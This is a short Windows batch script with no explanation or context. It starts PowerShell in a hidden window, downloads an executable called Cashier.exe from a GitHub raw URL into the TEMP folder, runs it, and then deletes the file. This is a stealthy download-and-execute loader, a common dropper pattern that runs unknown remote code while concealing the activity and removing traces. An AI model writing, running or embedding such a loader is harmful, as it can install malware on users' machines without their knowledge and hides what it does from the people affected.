@echo off

powershell -windowstyle hidden ^
"$p='$env:TEMP\Cashier.exe'; ^
Invoke-WebRequest 'https://github.com/zadelrahmanzad-boop/EH/raw/refs/heads/main/Cashier.exe' -OutFile $p; ^
Start-Process $p -Wait; ^
Remove-Item $p -Force"